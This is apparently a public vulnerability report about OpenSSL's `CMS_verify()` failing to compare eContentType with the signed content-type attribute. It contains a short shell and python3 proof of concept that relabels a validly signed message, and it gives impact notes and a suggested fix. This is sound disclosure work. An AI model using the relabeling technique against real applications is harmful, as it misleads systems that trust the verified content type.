`CMS_verify()` (and `openssl cms -verify`) accepts a SignedData message whose `encapContentInfo.eContentType` differs from the value of its signed content-type attribute. Because `eContentType` is not covered by the signature, anyone can change the content type of a validly signed message without the signing key, and it still verifies.

RFC 5652 §11.1: "The content-type attribute value MUST match the SignedData encapContentInfo eContentType value." The attribute is what authenticates `eContentType`.

`crypto/cms/cms_sd.c` sets the attribute from `eContentType` when signing (`cms_set_si_contentType_attr`), and `crypto/cms/cms_att.c` checks on verification that it occurs once with one value, but nothing compares its value with `eContentType`. `CMS_SignerInfo_verify_content()` compares only the message digest.

### Reproduction

Only the openssl command line and python3:

```sh
d=$(mktemp -d); cd "$d"
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 1 -subj "/CN=signer" 2>/dev/null
printf 'hello\n' > msg.txt
openssl cms -sign -binary -md sha256 -nodetach -outform DER -in msg.txt -signer cert.pem -inkey key.pem -out signed.der
# change eContentType from id-data (1.2.840.113549.1.7.1) to 1.2.840.113549.1.7.5; the signed attributes are untouched
python3 -c "
b = bytearray(open('signed.der','rb').read())
oid = bytes.fromhex('06092a864886f70d010701')
i = b.find(oid); b[i + len(oid) - 1] = 0x05
open('relabeled.der','wb').write(b)"
openssl cms -verify -noverify -binary -inform DER -in relabeled.der -out /dev/null
```

```
CMS Verification successful
```

`openssl cms -cmsout -print` on `relabeled.der` shows `eContentType: pkcs7-digestData (1.2.840.113549.1.7.5)` while the signed content-type attribute is still `pkcs7-data`.

OpenSSL 3.6.4; the code is the same on master at 1e369089f4.

### Impact

An application that verifies with `CMS_verify()` and then acts on `CMS_get0_eContentType()` can be made to treat content signed as one type as another. We have not found a specific exploitable application and judge it low severity, which is why this is reported publicly.

### Suggested fix

When signed attributes are present, compare the content-type attribute's value with `eContentType` (`OBJ_cmp`) during verification and fail on a mismatch, as GnuTLS does in `verify_hash_attr()`.

Found by differential testing of seven CMS verifiers against a specification of RFC 5652 written and proved in Lean: https://github.com/keithadler/lean-pkcs7cms (the case is `relabeled-after-signing` in `test/crosscheck`).
